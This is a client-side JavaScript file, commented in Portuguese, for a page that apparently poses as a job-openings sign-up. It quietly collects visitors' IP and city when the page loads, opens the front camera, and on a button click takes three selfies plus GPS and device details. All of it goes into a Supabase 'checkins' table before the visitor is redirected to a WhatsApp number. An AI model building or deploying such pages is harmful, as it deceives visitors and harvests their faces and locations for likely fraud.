// =================================================================
// CONFIGURAÇÃO SUPABASE
// =================================================================
const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Elementos
const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// =================================================================
// ÁUDIO
// =================================================================
function falar(texto){
  speechSynthesis.cancel();
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  fala.volume = 1;
  fala.rate = 0.95;
  speechSynthesis.speak(fala);
}

// =================================================================
// SALVAR NO BANCO
// =================================================================
async function salvarNoBanco(dados) {
  try {
    const { error } = await supabaseClient.from('checkins').insert([dados]);
    if (error) console.error(error);
    else console.log("✅ Salvo:", dados.tipo_captura);
    return true;
  } catch(err) {
    console.error(err);
    return false;
  }
}

// =================================================================
// PRÉ-CADASTRO (AO ABRIR A PÁGINA)
// =================================================================
async function salvarPreCadastro() {
  try {
    statusText.innerHTML = "🌐 Salvando pré-cadastro (IP)...";

    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    const dadosPre = {
      tipo_captura: "previa",
      ip: data.ip || "indisponível",
      cidade: data.city || "",
      estado: data.region || "",
      pais: data.country_name || "",
      user_agent: navigator.userAgent,
      timestamp: new Date().toISOString()
    };

    await salvarNoBanco(dadosPre);
    statusText.innerHTML = "✅ Pré-cadastro salvo!<br>Clique no botão para completar.";

  } catch(e) {
    console.error(e);
    statusText.innerHTML = "⚠️ Pré-cadastro falhou";
  }
}

// =================================================================
// INICIALIZAÇÃO
// =================================================================
window.onload = async () => {
  falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
  statusText.innerHTML = "🟡 Iniciando...";
  await salvarPreCadastro();   // ← Pré-cadastro

  // Inicia câmera
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = stream;
    await video.play();
  } catch(e) {}
};

// =================================================================
// BOTÃO - CADASTRO COMPLETO
// =================================================================
btn.addEventListener("click", async () => {
  try {
    btn.disabled = true;
    btn.innerHTML = "PROCESSANDO...";

    statusText.innerHTML = "📸 Capturando fotos...";

    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    const fotos = [];

    for(let i = 0; i < 3; i++) {
      ctx.drawImage(video, 0, 0, 640, 480);
      fotos.push(canvas.toDataURL("image/jpeg", 0.35));
      if(i < 2) await new Promise(r => setTimeout(r, 1000));
    }

    if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());

    // GPS
    let latitude = "não permitido", longitude = "não permitido";
    try {
      const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
      latitude = pos.coords.latitude;
      longitude = pos.coords.longitude;
    } catch(e) {}

    // IP
    let ip = "indisponível", cidade = "", estado = "", pais = "";
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      ip = data.ip;
      cidade = data.city;
      estado = data.region;
      pais = data.country_name;
    } catch(e) {}

    const infoDispositivo = analisarDispositivo();

    await salvarNoBanco({
      tipo_captura: "completo",
      selfies: fotos,
      latitude: latitude.toString(),
      longitude: longitude.toString(),
      ip: ip,
      cidade: cidade,
      estado: estado,
      pais: pais,
      user_agent: navigator.userAgent,
      modelo_dispositivo: infoDispositivo.model,
      versao_android: infoDispositivo.androidVersion,
      navegador: infoDispositivo.browser,
      plataforma: navigator.platform,
      largura_tela: window.innerWidth,
      altura_tela: window.innerHeight
    });

    statusText.innerHTML = "✅ Cadastro completo!";
    falar("Cadastro concluído com sucesso.");

    setTimeout(() => {
      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
    }, 2000);

  } catch(err) {
    console.error(err);
    statusText.innerHTML = "❌ Erro ao salvar.";
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  }
});

function analisarDispositivo() {
  const ua = navigator.userAgent;
  let androidVersion = "Não é Android";
  if (ua.indexOf("Android") >= 0) {
    const match = ua.match(/Android\s([0-9\.]+)/);
    if (match) androidVersion = match[1];
  }
  return { androidVersion, model: "Mobile", browser: "Chrome" };
}
